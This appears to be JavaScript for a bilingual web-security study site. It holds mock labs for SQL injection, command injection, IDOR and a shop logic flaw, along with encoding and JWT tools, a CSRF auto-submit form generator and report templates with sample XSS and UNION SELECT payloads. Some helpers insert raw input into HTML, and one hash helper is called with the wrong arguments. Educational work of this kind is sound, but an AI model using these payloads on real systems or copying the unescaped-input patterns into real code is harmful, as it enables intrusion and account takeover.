function simulateSQL() {
  const username = document.getElementById('sql-username')?.value || '';
  const password = document.getElementById('sql-password')?.value || '';
  const queryEl = document.getElementById('sql-query');
  const resultEl = document.getElementById('sql-result');

  if (!queryEl || !resultEl) return;

  // Build SQL query
  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  queryEl.textContent = query;

  // Check for SQL injection patterns
  const hasInjection = username.includes("'") || username.includes('--') ||
    username.toLowerCase().includes(' or ') ||
    password.includes("'") || password.includes('--');

  if (hasInjection) {
    resultEl.className = 'alert alert-danger';
    resultEl.innerHTML = `
      <strong><i class="fa-solid fa-unlock"></i> Authentication Bypassed!</strong><br>
      <i class="fa-solid fa-check-circle"></i> SQL Injection detected!<br>
      <strong>Vulnerable patterns found:</strong><br>
      ${username.includes("'") ? "✅ Single quote (') in username<br>" : ''}
      ${username.includes('--') ? "✅ SQL comment (--) detected<br>" : ''}
      ${username.toLowerCase().includes(' or ') ? "✅ OR logic detected<br>" : ''}
      <div class="mt-2 p-2 bg-dark text-light rounded">
        <strong>Simulated Result:</strong> Login successful as 'admin' (bypassed!)
      </div>
    `;
  } else {
    resultEl.className = 'alert alert-success';
    resultEl.innerHTML = `
      <strong><i class="fa-solid fa-lock"></i> Normal Login Attempt</strong><br>
      No SQL injection patterns detected.<br>
      ${username === 'admin' && password === 'password' ?
        '<div class="mt-2 p-2 bg-success text-white rounded">✅ Valid credentials - Login successful!</div>' :
        '<div class="mt-2 p-2 bg-warning text-dark rounded">❌ Invalid credentials - Access denied</div>'
      }
    `;
  }
}

// Base64 Encoder/Decoder
function base64Encode() {
  const input = document.getElementById('base64-input')?.value || '';
  const out = document.getElementById('base64-output');
  if (!out) return;

  if (!input) {
    out.value = '';
    return;
  }

  try {
    out.value = btoa(unescape(encodeURIComponent(input)));
  } catch (e) {
    // Fallback for characters that can't be encoded
    try {
      out.value = btoa(input);
    } catch (e2) {
      out.value = 'Encoding error: Input contains characters that cannot be Base64 encoded';
    }
  }
}

function base64Decode() {
  const input = document.getElementById('base64-input')?.value || '';
  const out = document.getElementById('base64-output');
  if (!out) return;

  // Clean the input - remove spaces and newlines
  const cleanInput = input.replace(/\s/g, '');

  if (!cleanInput) {
    out.value = '';
    return;
  }

  try {
    // Check if it's already decoded text (not Base64)
    if (!/^[A-Za-z0-9+/]*={0,2}$/.test(cleanInput)) {
      out.value = 'Input does not appear to be Base64 encoded';
      return;
    }

    // Try to decode
    out.value = decodeURIComponent(escape(atob(cleanInput)));
  } catch (e) {
    // Try alternative decoding methods
    try {
      // Try without the unescape/escape wrapper
      out.value = atob(cleanInput);
    } catch (e2) {
      out.value = 'Decoding error: Invalid Base64 string. Make sure the input is properly Base64 encoded.';
    }
  }
}

// URL Encoder/Decoder
function urlEncode() {
  const input = document.getElementById('url-input')?.value || '';
  const out = document.getElementById('url-output');
  if (!out) return;
  try {
    out.value = encodeURIComponent(input);
  } catch (e) {
    out.value = 'Encoding error: ' + e.message;
  }
}

function urlDecode() {
  const input = document.getElementById('url-input')?.value || '';
  const out = document.getElementById('url-output');
  if (!out) return;
  try {
    out.value = decodeURIComponent(input);
  } catch (e) {
    out.value = 'Decoding error: Invalid URL encoding';
  }
}

// Update JWT Decoder to support new layout
function decodeJWT() {
  const token = document.getElementById('jwt-input')?.value.trim();
  const headerOut = document.getElementById('jwt-header');
  const payloadOut = document.getElementById('jwt-payload');
  const signatureOut = document.getElementById('jwt-signature');
  const legacyOut = document.getElementById('jwt-output');

  if (!token) return;

  const parts = token.split('.');
  if (parts.length !== 3) {
    const errorMsg = 'Invalid JWT token format. Expected 3 parts separated by dots.';
    if (headerOut) headerOut.textContent = errorMsg;
    if (legacyOut) legacyOut.textContent = errorMsg;
    return;
  }

  try {
    const header = JSON.parse(new TextDecoder().decode(base64urlToBytes(parts[0])));
    const payload = JSON.parse(new TextDecoder().decode(base64urlToBytes(parts[1])));
    const signature = parts[2];

    // New layout (Security Playground)
    if (headerOut && payloadOut && signatureOut) {
      headerOut.textContent = JSON.stringify(header, null, 2);
      payloadOut.textContent = JSON.stringify(payload, null, 2);
      signatureOut.textContent = signature;
    }

    // Legacy layout (old tabs)
    if (legacyOut) {
      legacyOut.textContent = JSON.stringify({ header, payload, signature }, null, 2);
    }
  } catch (e) {
    const errorMsg = 'Decode error: ' + e.message;
    if (headerOut) headerOut.textContent = errorMsg;
    if (legacyOut) legacyOut.textContent = errorMsg;
  }
}
async function generateHash(algorithm) {
  const input = document.getElementById('hash-input')?.value || '';
  const out = document.getElementById('hash-output');
  if (!out) return;
  const data = new TextEncoder().encode(input);
  try {
    const digest = await crypto.subtle.digest(algorithm, data);
    out.textContent = Array.from(new Uint8Array(digest)).map(b => b.toString(16).padStart(2, '0')).join('');
  } catch (e) { out.textContent = 'Hash error'; }
}
function testCORS() {
  const url = document.getElementById('cors-url')?.value.trim();
  const out = document.getElementById('cors-output');
  if (!out) return;

  if (!url) {
    out.textContent = txt('الرجاء إدخال URL', 'Please enter a URL');
    return;
  }

  out.textContent = txt('جاري الاختبار...', 'Testing...');

  fetch(url, { method: 'GET' })
    .then(response => {
      const corsHeaders = {
        'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
        'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
        'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods')
      };

      let result = `Status: ${response.status} ${response.statusText}\n\nCORS Headers:\n`;
      let vulnerable = false;

      if (corsHeaders['Access-Control-Allow-Origin']) {
        result += `Access-Control-Allow-Origin: ${corsHeaders['Access-Control-Allow-Origin']}\n`;
        if (corsHeaders['Access-Control-Allow-Origin'] === '*') vulnerable = true;
      } else {
        result += 'Access-Control-Allow-Origin: (Missing)\n';
      }

      if (corsHeaders['Access-Control-Allow-Credentials']) {
        result += `Access-Control-Allow-Credentials: ${corsHeaders['Access-Control-Allow-Credentials']}\n`;
        if (corsHeaders['Access-Control-Allow-Credentials'] === 'true' && corsHeaders['Access-Control-Allow-Origin'] !== '*') vulnerable = true;
      }

      result += '\nAnalysis:\n';
      if (vulnerable) {
        result += '⚠️ Potentially misconfigured CORS policy detected!';
      } else {
        result += '✅ CORS policy seems restrictive (or missing).';
      }

      out.textContent = result;
    })
    .catch(err => {
      out.textContent = 'Error: ' + err.message + '\n(This might be due to CORS blocking the request itself, which is good!)';
    });
}

// Command Injection Simulator
function simulateCmdInjection() {
  const input = document.getElementById('cmd-input')?.value || '';
  const out = document.getElementById('cmd-output');
  if (!out) return;

  // Simulate command execution
  let output = `root@server:~$ ping -c 4 ${input}\n`;

  // Check for injection characters
  const injectionChars = [';', '|', '&', '`', '$', '\n'];
  const hasInjection = injectionChars.some(char => input.includes(char));

  if (hasInjection) {
    // Extract the injected command (simplified logic)
    let injectedCmd = '';
    if (input.includes(';')) injectedCmd = input.split(';')[1];
    else if (input.includes('|')) injectedCmd = input.split('|')[1];
    else if (input.includes('&')) injectedCmd = input.split('&')[1];

    injectedCmd = injectedCmd.trim();

    // Simulate ping output first
    output += `PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=14.2 ms\n...\n\n`;

    // Simulate injected command output
    if (injectedCmd.startsWith('ls')) {
      output += `root@server:~$ ${injectedCmd}\nindex.php\nconfig.php\nusers.db\npasswords.txt\n`;
    } else if (injectedCmd.startsWith('whoami')) {
      output += `root@server:~$ ${injectedCmd}\nroot\n`;
    } else if (injectedCmd.startsWith('cat /etc/passwd')) {
      output += `root@server:~$ ${injectedCmd}\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nuser:x:1000:1000:user:/home/user:/bin/bash\n`;
    } else if (injectedCmd.startsWith('id')) {
      output += `root@server:~$ ${injectedCmd}\nuid=0(root) gid=0(root) groups=0(root)\n`;
    } else {
      output += `root@server:~$ ${injectedCmd}\nbash: ${injectedCmd.split(' ')[0]}: command not found\n`;
    }

    output += `\n<span class="text-danger">⚠️ Command Injection Successful!</span>`;
  } else {
    // Normal ping output
    if (input.match(/^[\d\.]+$/)) {
      output += `PING ${input} (${input}) 56(84) bytes of data.\n64 bytes from ${input}: icmp_seq=1 ttl=117 time=14.2 ms\n64 bytes from ${input}: icmp_seq=2 ttl=117 time=13.8 ms\n64 bytes from ${input}: icmp_seq=3 ttl=117 time=15.1 ms\n64 bytes from ${input}: icmp_seq=4 ttl=117 time=14.5 ms\n\n--- ${input} ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3004ms`;
    } else {
      output += `ping: ${input}: Name or service not known`;
    }
  }

  out.innerHTML = output;
}

// IDOR Simulator
function simulateIDOR() {
  const id = document.getElementById('idor-input')?.value;
  const resultBox = document.getElementById('idor-result');

  if (!resultBox) return;

  resultBox.innerHTML = '<div class="text-center"><div class="spinner-border text-primary" role="status"></div></div>';

  setTimeout(() => {
    // Mock Database
    const users = {
      '101': { id: 101, name: 'User', email: 'user@example.com', role: 'User', secret: 'None' },
      '100': { id: 100, name: 'Admin', email: 'admin@example.com', role: 'Admin', secret: 'FLAG{IDOR_MASTER_123}' },
      '102': { id: 102, name: 'John Doe', email: 'john@example.com', role: 'User', secret: 'My secret note' }
    };

    const user = users[id];

    if (user) {
      let resultHtml = `
        <div class="alert ${user.role === 'Admin' ? 'alert-danger' : 'alert-success'}">
          <h5><i class="fa-solid fa-user"></i> User Profile Found</h5>
          <p><strong>ID:</strong> ${user.id}</p>
          <p><strong>Name:</strong> ${user.name}</p>
          <p><strong>Email:</strong> ${user.email}</p>
          <p><strong>Role:</strong> ${user.role}</p>
      `;

      if (user.role === 'Admin') {
        resultHtml += `<hr><p class="text-danger fw-bold"><i class="fa-solid fa-flag"></i> Secret: ${user.secret}</p>`;
        resultHtml += `</div><div class="alert alert-warning">⚠️ You successfully accessed Admin data via IDOR!</div>`;
      } else if (id !== '101') {
        resultHtml += `<hr><p><strong>Secret:</strong> ${user.secret}</p>`;
        resultHtml += `</div><div class="alert alert-warning">⚠️ You accessed another user's data!</div>`;
      } else {
        resultHtml += `</div><div class="alert alert-info">This is your own profile. Try changing the ID.</div>`;
      }

      resultBox.innerHTML = resultHtml;
    } else {
      resultBox.innerHTML = `<div class="alert alert-secondary">User ID ${id} not found.</div>`;
    }
  }, 500);
}

function loadUserProfile(id) {
  document.getElementById('idor-input').value = id;
  simulateIDOR();
}

// Logic Flaw Shop
let shopCredit = 100;
const shopLog = [];

function updateShopLog(msg, type = 'info') {
  const logBox = document.getElementById('shop-log');
  const time = new Date().toLocaleTimeString();
  const color = type === 'error' ? 'text-danger' : (type === 'success' ? 'text-success' : 'text-dark');
  shopLog.unshift(`<div class="${color}">[${time}] ${msg}</div>`);
  if (logBox) logBox.innerHTML = shopLog.join('');
}

function buyItem(item) {
  const prices = { 'flag': 1000, 'shirt': 20 };
  const qtyInput = document.getElementById(`qty-${item}`);
  const qty = parseInt(qtyInput?.value || 0);

  if (!qty) return;

  const price = prices[item];
  const total = price * qty;

  updateShopLog(`Attempting to buy ${qty} ${item}(s) for $${total}...`);

  // Logic Flaw: Negative quantity check missing or exploitable
  if (total > shopCredit) {
    // Check if total is negative (Integer Overflow / Negative Logic)
    if (total < 0) {
      shopCredit -= total; // Subtracting negative adds money!
      updateShopLog(`Transaction Successful! Balance updated.`, 'success');
      updateShopLog(`Wait... did you just exploit a logic flaw? Current Balance: $${shopCredit}`, 'success');
      if (item === 'flag') {
        updateShopLog(`🚩 FLAG{LOGIC_FLAW_BILLIONAIRE}`, 'success');
        alert('Congratulations! You bought the flag using a logic flaw!');
      }
    } else {
      updateShopLog(`Transaction Failed: Insufficient funds. You have $${shopCredit}`, 'error');
    }
  } else {
    shopCredit -= total;
    updateShopLog(`Transaction Successful! New Balance: $${shopCredit}`, 'success');
    if (item === 'flag') {
      updateShopLog(`🚩 FLAG{RICH_KID_BUYER}`, 'success'); // Legitimate buy if they somehow got money
    }
  }
}

function httpRequest() {
  const url = document.getElementById('http-url')?.value.trim();
  const method = document.getElementById('http-method')?.value || 'GET';
  const headersStr = document.getElementById('http-headers')?.value.trim() || '';
  const bodyStr = document.getElementById('http-body')?.value.trim() || '';
  const out = document.getElementById('http-output');
  if (!url || !out) return;
  let headers = {}; try { if (headersStr) headers = JSON.parse(headersStr); } catch (e) { }
  const opts = { method, headers };
  if (['POST', 'PUT', 'PATCH'].includes(method) && bodyStr) opts.body = bodyStr;
  const t0 = performance.now();
  fetch(url, opts).then(async resp => {
    const t1 = performance.now();
    const text = await resp.text();
    out.textContent = `Status: ${resp.status} (${Math.round(t1 - t0)} ms)

Headers:
` + JSON.stringify(Object.fromEntries(resp.headers.entries()), null, 2) + `

Body:
` + text;
  }).catch(err => { out.textContent = 'Request error: ' + err; });
}
let _ws;
function wsConnect() {
  const url = document.getElementById('ws-url')?.value.trim();
  const log = document.getElementById('ws-log');
  if (!url || !log) return;
  try { _ws = new WebSocket(url); } catch (e) { log.textContent = 'WS error: ' + e; return; }
  _ws.onopen = () => log.textContent += '\n[open]';
  _ws.onmessage = (ev) => log.textContent += `\n[msg] ${ev.data}`;
  _ws.onclose = () => log.textContent += '\n[close]';
  _ws.onerror = (e) => log.textContent += '\n[error]';
}
function wsSend() {
  const msg = document.getElementById('ws-message')?.value || '';
  const log = document.getElementById('ws-log');
  if (_ws && _ws.readyState === 1) { _ws.send(msg); if (log) log.textContent += `\n[send] ${msg}`; }
}
function wsClose() { if (_ws) _ws.close(); }
function inspectStorage() {
  const out = document.getElementById('storage-output'); if (!out) return;
  const ls = {}; for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage.getItem(k); }
  const ss = {}; for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = sessionStorage.getItem(k); }
  out.textContent = JSON.stringify({ localStorage: ls, sessionStorage: ss, cookies: document.cookie }, null, 2);
}
function analyzeHeaders() {
  const url = document.getElementById('headers-url')?.value.trim();
  const out = document.getElementById('headers-output');
  if (!url || !out) return;
  fetch(url, { method: 'GET' }).then(resp => {
    const h = resp.headers;
    const keys = ['content-security-policy', 'x-frame-options', 'x-content-type-options', 'referrer-policy', 'strict-transport-security', 'permissions-policy'];
    const report = Object.fromEntries(keys.map(k => [k, h.get(k) || 'missing']));
    out.textContent = JSON.stringify(report, null, 2);
  }).catch(err => { out.textContent = 'Analyze error: ' + err; });
}
function generateCSRF() {
  const action = document.getElementById('csrf-action')?.value || '';
  const method = document.getElementById('csrf-method')?.value || 'GET';
  const params = document.getElementById('csrf-params')?.value || '';
  const out = document.getElementById('csrf-output'); if (!out) return;
  const inputs = params.split('&').map(p => {
    const [k, v] = p.split('='); return `<input type="hidden" name="${k}" value="${v}">`;
  }).join('');
  const html = `<form action="${action}" method="${method}">${inputs}</form><script>document.forms[0].submit()<\/script>`;
  out.textContent = html;
}
function base64urlToBytes(str) {
  str = str.replace(/-/g, '+').replace(/_/g, '/');
  const pad = str.length % 4 === 2 ? '==' : str.length % 4 === 3 ? '=' : '';
  const bin = atob(str + pad);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes.buffer;
}
function bytesToBase64url(bytes) {
  let bin = ''; const arr = new Uint8Array(bytes);
  for (let i = 0; i < arr.length; i++) bin += String.fromCharCode(arr[i]);
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
async function jwtVerifyHS() {
  const token = document.getElementById('jwtv-token')?.value.trim();
  const secret = document.getElementById('jwtv-secret')?.value || '';
  const out = document.getElementById('jwtv-result'); if (!token || !out) return;
  const parts = token.split('.'); if (parts.length !== 3) { out.textContent = 'Invalid token'; return; }
  const data = new TextEncoder().encode(parts[0] + '.' + parts[1]);
  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', key, data);
  const calc = bytesToBase64url(sig);
  out.textContent = calc === parts[2] ? 'HS256 signature valid' : 'Invalid signature';
}
async function jwtVerifyRS() {
  const token = document.getElementById('jwtv-token')?.value.trim();
  const pem = document.getElementById('jwtv-public')?.value || '';
  const out = document.getElementById('jwtv-result'); if (!token || !out) return;
  const parts = token.split('.'); if (parts.length !== 3) { out.textContent = 'Invalid token'; return; }
  const data = new TextEncoder().encode(parts[0] + '.' + parts[1]);
  const sigBytes = base64urlToBytes(parts[2]);
  try {
    const spki = await pemToSpki(pem);
    const key = await crypto.subtle.importKey('spki', spki, { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' }, false, ['verify']);
    const ok = await crypto.subtle.verify('RSASSA-PKCS1-v1_5', key, sigBytes, data);
    out.textContent = ok ? 'RS256 signature valid' : 'Invalid signature';
  } catch (e) { out.textContent = 'Verify error'; }
}
async function pemToSpki(pem) {
  const b64 = pem.replace(/-----BEGIN PUBLIC KEY-----/, '').replace(/-----END PUBLIC KEY-----/, '').replace(/\s+/g, '');
  const bin = atob(b64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes.buffer;
}

// ===== Settings Functions =====
function changeLanguageSetting() {
  const lang = document.getElementById('lang-setting')?.value;
  if (lang) {
    currentLang = lang;
    localStorage.setItem('preferredLanguage', lang);
    document.documentElement.lang = lang;
    document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
    document.getElementById('lang-toggle').innerHTML = lang === 'ar' ? '<i class="fas fa-language"></i> English' : '<i class="fas fa-language"></i> العربية';
    renderNav();
    loadPage(currentPage);
  }
}

function resetAllData() {
  if (confirm(txt('هل أنت متأكد من حذف جميع البيانات؟', 'Are you sure you want to delete all data?'))) {
    localStorage.clear();
    location.reload();
  }
}

// Old bookmarks functions removed (see new implementation below)

// ===== Checklist Functions =====
function toggleChecklist(id) {
  const checkbox = document.getElementById(id);
  if (!checkbox) return;

  // Save state
  const checklistState = JSON.parse(localStorage.getItem('checklistState') || '{}');
  checklistState[id] = checkbox.checked;
  localStorage.setItem('checklistState', JSON.stringify(checklistState));

  // Update Progress Bars
  updateChecklistProgress('ejpt');
  updateChecklistProgress('bb');
}

function updateChecklistProgress(prefix) {
  const checkboxes = document.querySelectorAll(`input[id^="${prefix}-"]`);
  if (checkboxes.length === 0) return;

  const total = checkboxes.length;
  const checked = Array.from(checkboxes).filter(cb => cb.checked).length;
  const percent = Math.round((checked / total) * 100);

  const progressBar = document.getElementById(`${prefix}-progress`);
  if (progressBar) {
    progressBar.style.width = `${percent}%`;
    progressBar.textContent = `${percent}%`;
    progressBar.className = `progress-bar progress-bar-striped progress-bar-animated ${percent === 100 ? 'bg-success' : (percent > 50 ? 'bg-info' : 'bg-warning')}`;
  }
}

function restoreChecklists() {
  const checklistState = JSON.parse(localStorage.getItem('checklistState') || '{}');
  Object.keys(checklistState).forEach(id => {
    const checkbox = document.getElementById(id);
    if (checkbox) {
      checkbox.checked = checklistState[id];
    }
  });

  // Update bars after restoration
  updateChecklistProgress('ejpt');
  updateChecklistProgress('bb');
}



// ===== Copy custom payload =====
function copyCustomPayload(payload) {
  navigator.clipboard.writeText(payload).then(() => {
    alert(txt('تم النسخ!', 'Copied!'));
  });
}

// ===== Report Templates & Export =====
function loadTemplate(type) {
  const templates = {
    bugbounty: `# Bug Bounty Report

## Vulnerability Title
Reflected XSS on search parameter

## Severity
High (CVSS 7.5)

## Summary
A reflected XSS vulnerability exists in the search functionality at /search?q=...

## Steps to Reproduce
1. Navigate to https://example.com/search
2. Enter payload in search box: <script>alert(document.cookie)</script>
3. Click search button
4. Observe JavaScript execution

## Proof of Concept
GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: example.com

## Impact
- Session hijacking via cookie theft
- Phishing attacks
- Malware distribution
- Account takeover

## Remediation
1. Encode all user input before rendering in HTML
2. Implement Content Security Policy (CSP)
3. Use X-XSS-Protection header
4. Validate and sanitize all parameters

## References
- https://owasp.org/www-community/attacks/xss/
- https://portswigger.net/web-security/cross-site-scripting`,

    pentest: `# Penetration Test Report

## Executive Summary
This report documents the findings of the penetration test conducted on [Target Name] from [Date] to [Date].

## Scope
- Target: example.com
- IP Range: 192.168.1.0/24
- Authorized Testing Period: [Dates]

## Methodology
1. Reconnaissance
2. Vulnerability Scanning
3. Exploitation
4. Post-Exploitation
5. Reporting

## Findings

### Critical Findings
#### 1. SQL Injection in Login Form
- Severity: Critical (CVSS 9.8)
- Location: /login.php
- Description: Union-based SQL injection allows database enumeration
- Proof of Concept: ' UNION SELECT 1,2,username,password,5 FROM users--
- Remediation: Use prepared statements/parameterized queries

### High Findings
#### 2. Stored XSS in Comment Section
- Severity: High (CVSS 7.5)
- Location: /comments
- Description: Persistent XSS via comment field
- Remediation: Implement output encoding and CSP

## Recommendations
1. Implement WAF (Web Application Firewall)
2. Regular security audits
3. Security awareness training
4. Patch management process

## Conclusion
[Summary of findings and next steps]`,

    disclosure: `# Responsible Disclosure Report

## Contact Information
- Researcher: [Your Name]
- Email: [Your Email]
- Date: [Date]

## Vulnerability Details

### Title
[Vulnerability Title]

### Affected Product
- Product: [Product Name]
- Version: [Version]
- URL: [Affected URL]

### Description
[Detailed description of the vulnerability]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Proof of Concept
[Code or request demonstrating the vulnerability]

### Impact
[Description of potential impact]

### Proposed Fix
[Recommended remediation steps]

### Timeline
- Discovered: [Date]
- Reported: [Date]
- Fixed: [Expected 90 days from report]
- Public Disclosure: [After fix + 7 days]

### Disclosure Policy
I am following responsible disclosure practices and will not publicly disclose this vulnerability until:
1. A fix has been implemented, OR
2. 90 days have passed since initial report

I am available for any clarifications or additional information.

Thank you for your attention to this matter.`,

    cvss: `# CVSS-Based Vulnerability Report

## Vulnerability Information

### CVSS v3.1 Score
Base Score: 7.5 (High)

Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

### Breakdown
- Attack Vector (AV): Network
- Attack Complexity (AC): Low
- Privileges Required (PR): None
- User Interaction (UI): None
- Scope (S): Unchanged
- Confidentiality (C): High
- Integrity (I): None
- Availability (A): None

## Vulnerability Details

### Title
[Vulnerability Name]

### Description
[Technical description]

### Affected Components
[List of affected systems/URLs]

### Exploitation Requirements
- No authentication required
- Exploitable from internet
- Low technical skill required

### Evidence
[Screenshots and logs]

### Remediation
[Fix recommendations with priority based on CVSS score]

### References
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- CVE ID: [If applicable]`
  };

  const textarea = document.getElementById('report-md');
  if (textarea && templates[type]) {
    textarea.value = templates[type];
  }
}

function copyReport() {
  const md = document.getElementById('report-md')?.value || '';
  if (md) {
    navigator.clipboard.writeText(md).then(() => {
      alert(txt('تم نسخ التقرير!', 'Report copied!'));
    });
  }
}

function exportReportHTML() {
  const md = document.getElementById('report-md')?.value || '';
  if (!md) return;

  // Simple Markdown to HTML conversion
  let html = md
    .replace(/^### (.+)$/gm, '<h3>$1</h3>')
    .replace(/^## (.+)$/gm, '<h2>$1</h2>')
    .replace(/^# (.+)$/gm, '<h1>$1</h1>')
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.+?)\*/g, '<em>$1</em>')
    .replace(/`(.+?)`/g, '<code>$1</code>')
    .replace(/^- (.+)$/gm, '<li>$1</li>')
    .replace(/^\d+\. (.+)$/gm, '<li>$1</li>')
    .replace(/\n\n/g, '</p><p>')
    .replace(/```([\s\S]+?)```/g, '<pre><code>$1</code></pre>');

  html = '<p>' + html + '</p>';
  html = html.replace(/<\/li>\n<li>/g, '</li><li>');
  html = html.replace(/(<li>.*<\/li>)/s, '<ul>$1</ul>');

  const fullHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vulnerability Report</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; max-width: 800px; margin: 40px auto; padding: 20px; line-height: 1.6; color: #333; }
    h1 { color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }
    h2 { color: #34495e; border-bottom: 2px solid #95a5a6; padding-bottom: 8px; margin-top: 30px; }
    h3 { color: #7f8c8d; margin-top: 20px; }
    code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; }
    pre { background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px; overflow-x: auto; }
    pre code { background: none; padding: 0; color: #ecf0f1; }
    ul, ol { margin-left: 20px; }
    li { margin: 8px 0; }
    strong { color: #e74c3c; }
    @media print { body { max-width: 100%; } }
  </style>
</head>
<body>
${html}
</body>
</html>`;

  const blob = new Blob([fullHTML], { type: 'text/html' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'vulnerability-report.html';
  a.click();
}

// ========== Integrated Tools Helper Functions ==========

// Encoder/Decoder functions
window.encodeText = function (format) {
  const input = document.getElementById('encoder-input').value;
  const output = encoderDecoderTool.encode[format](input);
  document.getElementById('encoder-output').value = output;
};

window.decodeText = function (format) {
  const input = document.getElementById('encoder-input').value;
  const output = encoderDecoderTool.decode[format](input);
  document.getElementById('encoder-output').value = output;
};

// Hash Generator function
window.generateHashFromInput = async function (algorithm) {
  const input = document.getElementById('hash-input').value;
  if (!input) {
    alert(txt('الرجاء إدخال نص', 'Please enter text'));
    return;
  }

  try {
    const hash = await generateHash(input, algorithm);
    document.getElementById('hash-output').value = hash;
  } catch (error) {
    document.getElementById('hash-output').value = 'Error: ' + error.message;
  }
};

// Copy tool output
window.copyToolOutput = function (elementId) {
  const element = document.getElementById(elementId);
  const text = element.value || element.textContent;

  navigator.clipboard.writeText(text).then(() => {
    const originalBg = element.style.backgroundColor;
    element.style.backgroundColor = '#d4edda';
    setTimeout(() => {
      element.style.backgroundColor = originalBg;
    }, 500);
  }).catch(err => {
    alert('Failed to copy: ' + err);
  });
};

// Copy payload text (for SQL/XSS payloads)
window.copyPayloadText = function (button) {
  const code = button.previousElementSibling || button.parentElement.querySelector('code');
  const text = code.textContent;

  navigator.clipboard.writeText(text).then(() => {
    const originalHTML = button.innerHTML;
    button.innerHTML = '<i class="fa-solid fa-check"></i>';
    button.classList.remove('btn-outline-primary');
    button.classList.add('btn-success');

    setTimeout(() => {
      button.innerHTML = originalHTML;
      button.classList.remove('btn-success');
      button.classList.add('btn-outline-primary');
    }, 1000);
  }).catch(err => {
    alert('Failed to copy: ' + err);
  });
};

// Global function for viewing writeups
window.viewWriteup = function (id) {
  loadPage('writeup-viewer', id);
};

// ========== PLAYGROUND FUNCTIONS ==========

// 1. Command Lab Simulator
window.executeCommand = function () {
  const input = document.getElementById('cmd-input');
  const output = document.getElementById('cmd-output');

  if (!input || !output) return;

  const cmd = input.value.trim();
  if (!cmd) return;

  let response = '';

  switch (cmd.split(' ')[0]) {
    case 'ls': response = 'home  etc  var  tmp  flag.txt  notes.txt'; break;
    case 'whoami': response = 'root'; break;
    case 'id': response = 'uid=0(root) gid=0(root) groups=0(root)'; break;
    case 'cat':
      if (cmd.includes('flag.txt')) response = 'CTF{STUDY_HUB_PLAYGROUND_FLAG}';
      else if (cmd.includes('passwd')) response = 'root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash';
      else response = 'cat: ' + (cmd.split(' ')[1] || '') + ': No such file or directory';
      break;
    case 'pwd': response = '/root'; break;
    case 'date': response = new Date().toString(); break;
    case 'clear':
      output.innerText = '_ cursor waiting...';
      input.value = '';
      return;
    case 'help': response = 'Available commands: ls, cat, whoami, id, pwd, date, clear, help'; break;
    default: response = `bash: ${cmd}: command not found`;
  }

  output.innerText += `\nroot@kali:~# ${cmd}\n${response}`;
  output.scrollTop = output.scrollHeight;
  input.value = '';
}

// 2. Payload Tester
window.testPayload = function () {
  const input = document.getElementById('payload-input');
  const context = document.getElementById('injection-context');
  const resultDiv = document.getElementById('payload-result');

  if (!input || !context || !resultDiv) return;

  const payload = input.value;
  const ctx = context.value;

  if (!payload && payload !== '') { // allow empty check if triggered button? No.
    resultDiv.style.display = 'block';
    resultDiv.className = 'mt-3 p-3 rounded bg-warning text-dark';
    resultDiv.innerText = 'Please enter a payload';
    return;
  }
  if (!payload) return;

  let success = false;
  let msg = '';

  if (ctx === 'html') {
    if (payload.includes('<script>') || payload.includes('onerror=') || payload.includes('onload=')) {
      success = true;
      msg = 'Reflected XSS Execution Successful! Script executed.';
    } else {
      msg = 'Payload sanitized. No XSS execution.';
    }
  } else if (ctx === 'sql') {
    if (payload.includes("' OR") || payload.includes('UNION SELECT') || payload.includes('--')) {
      success = true;
      msg = 'SQL Injection Successful! Authentication bypassed.';
    } else {
      msg = 'Query safe. ID interpreted as integer.';
    }
  } else if (ctx === 'attr') {
    if (payload.includes('">') || payload.includes("'")) {
      success = true;
      msg = 'Attribute breakout successful!';
    } else {
      msg = 'Input validation active. Payload trapped in attribute.';
    }
  }

  resultDiv.style.display = 'block';
  if (success) {
    resultDiv.className = 'mt-3 p-3 rounded bg-danger text-white';
    resultDiv.innerHTML = `<i class="fa-solid fa-bug"></i> <strong>VULNERABLE!</strong><br>${msg}`;
  } else {
    resultDiv.className = 'mt-3 p-3 rounded bg-success text-white';
    resultDiv.innerHTML = `<i class="fa-solid fa-shield"></i> <strong>SAFE</strong><br>${msg}`;
  }
}

// 3. Load Tool Helper
window.loadTool = function (toolId) {
  if (typeof loadPage === 'function') {
    loadPage('tools');
  }
}

// Bookmarks helpers removed


// 2. Settings Logic
